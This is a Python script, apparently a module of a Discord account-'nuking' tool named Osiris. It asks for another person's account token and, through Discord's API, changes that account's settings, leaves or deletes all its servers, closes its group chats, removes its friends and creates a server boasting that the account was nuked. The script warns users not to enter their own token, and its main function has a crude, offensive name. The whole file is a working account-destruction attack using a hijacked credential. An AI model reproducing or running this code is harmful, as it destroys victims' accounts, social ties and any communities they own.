from colorama import Fore
import requests


def rape():
    print(Fore.RED + f'\n [!] >> ESTE MODULO JODERA LA CUENTA DEL TOKEN INGRESADO, NO PONER TU TOKEN PERSONAL <<  ' + Fore.RESET)
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Authorization' : input(Fore.BLUE + f"\n [>] Token: " + Fore.RESET)
    }
    

    payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

    print(Fore.GREEN + f"\n [+] Cambiando ajustes...")
    requests.patch(
        "https://canary.discordapp.com/api/v9/users/@me/settings",
        headers = headers,
        json = payload
    )
    print(f"\n [+] Detectando servers")

    guilds = requests.get(
        "https://discord.com/api/v9/users/@me/guilds",
        headers = headers
    ).json()

    print(Fore.GREEN + f" [+] {len(guilds)} servidores encontrados\n")

    for i in guilds:
        try:
            print(Fore.GREEN + f"  [+] Saliendo {i['name']} | Owner: {i['owner']}")
            if not i["owner"]:
                responce = requests.delete(
                    f"https://discord.com/api/users/@me/guilds/{i['id']}",
                    headers = headers
                )
            else:
                responce = requests.delete(
                    f"https://discord.com/api/guilds/{i['id']}",
                    headers = headers
                )
        except Exception as e:
            print(e)

    print(f"\n [+] Detectando grupos")

    dms = requests.get(
        "https://discord.com/api/v9/users/@me/channels",
        headers = headers
    ).json()
    print(f" [+] {len(guilds) - 1} grupos encontrados\n")

    for i in dms:
        print(f"  [+] Saliendo de grupos: {', '.join([x['username'] for x in i['recipients']])}")
        responce = requests.delete(
            f"https://discord.com/api/channels/{i['id']}",
            headers = headers
        )

    print(f"\n [+] Detectando amigos")

    relations = requests.get(
    "https://discord.com/api/v9/users/@me/relationships",
    headers = headers
    ).json()

    relations = [i for i in relations if i["type"] != 0]

    print(f" [+] {len(relations)} amigos encontrados")

    for i in relations:
        print(f"  [+] Eliminando {i['user']['username']} de amigos" + Fore.RESET)
        responce = requests.put(
            f"https://discord.com/api/v9/users/@me/relationships/{i['user']['id']}",
            headers = headers,
            json = {"type":0}
        )

    guild = {
        "channels" : None,
        "icon" : None,
        "name" : "Nuked Account Using Osiris",
        "region" : "japan"
    }
    requests.post(
        'https://discordapp.com/api/v9/guilds',
        headers = headers,
        json = guild
    )
